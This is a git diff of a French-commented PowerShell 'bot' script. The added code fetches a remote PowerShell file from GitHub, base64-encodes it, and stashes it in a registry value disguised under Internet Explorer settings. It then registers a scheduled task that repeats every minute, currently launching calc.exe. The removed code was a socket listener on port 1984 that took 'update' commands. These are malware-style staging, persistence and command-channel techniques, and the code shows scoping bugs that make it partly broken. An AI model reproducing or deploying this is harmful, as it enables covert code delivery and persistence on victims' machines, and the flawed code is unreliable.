@@ -1,41 +1,72 @@
-import-module "C:\lib\script1.ps1" -force
+Import-Module "c:\lib\script1.ps1"
 
+Function recupscript {
+#Chemin du script
+$gitLink   = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/bot.ps1'
 
-function decode{
-$Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))
+#Paramètres de la clé registre crée
+$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
+$nomCle    = 'bot1'
+$typeCle   = "String"
 
+#Récupération du git
+$recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing 
+
+# Conversion en Base64
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($recupGit)
+$convert64 =[Convert]::ToBase64String($Bytes)
+#$convert64
+
+#Création du hash
+$sha256 = New-Object -TypeName System.Security.Cryptography.SHA256CryptoServiceProvider
+$utf8 = New-Object -TypeName System.Text.UTF8Encoding
+$hash = [System.BitConverter]::ToString($sha256.ComputeHash($utf8.GetBytes($convert64)))
+
+#Récupération du hash actuel et sauvegarde dans une nouvelle clé registre
+try{
+    Get-ItemProperty $cheminCle | Select-Object -ExpandProperty valActuelle -ErrorAction Stop | Out-Null
+    $valActuelle = Get-ItemPropertyValue -Path $cheminCle -Name valActuelle
+}catch{
+    New-ItemProperty -Path $cheminCle -Name valActuelle -PropertyType String -Value $hash
+}
 }
 
 
-function global:FRX_Socket-MessageAction{
-    param($message)
-    $stop = $false
-    switch ($message) {
-        {$_ -match "update"  }{
-            write-host "update" -ForegroundColor green
-            $convert64 = get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name bot
-            echo $convert64
-
-            }
-
-
-
-
-
-        {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow}
-        {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
-                                    $stop=$true}
-        Default {write-host $message}
+Function update {
+#Mise à jour si besoin avec comparaison 
+if ($hash -eq $valActuelle){
+    #Ne rien faire
+}else{
+    #Création de la nouvelle clé registre
+    try {
+        Get-ItemProperty $cheminCle | Select-Object -ExcludeProperty bot1 -ErrorAction Stop | Out-Null
+        Set-ItemProperty -Path $cheminCle -Name bot1 -Value $convert64
+    }catch{
+        New-ItemProperty -Path $cheminCle -Name bot1 -PropertyType String -Value $convert64
     }
-
-    return $stop
+}
 }
 
-#netstat -ano | find "1984"
-$socket   = FRX_Socket-Listen-Connect -port 1984
-do{
-   $message  = FRX_Socket-Listen-Read -socket $socket -buffersize 512
-   $stop = FRX_Socket-MessageAction -message $message
-}until($stop)
+#Création de la tache 
 
-$closeACK = FRX_Socket-Listen-Close -socket $socket
+Function createtache {
+    $tache = New-ScheduledTaskAction -Execute "calc.exe" 
+    $date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
+    $nomTache = "test"
+    $testNom = Get-ScheduledTask $nomTache | Select -ExpandProperty Taskname
+
+
+    if( $testNom -eq $nomTache){
+    #On ne fait rien
+    echo "dejà la"
+    }else{
+    Register-ScheduledTask -TaskName $nomTache -Trigger $date -Action $tache -Description "Ouverture de la calculatrice" Task
+}
+}
+
+recupscript 
+
+update
+
+createtache
+
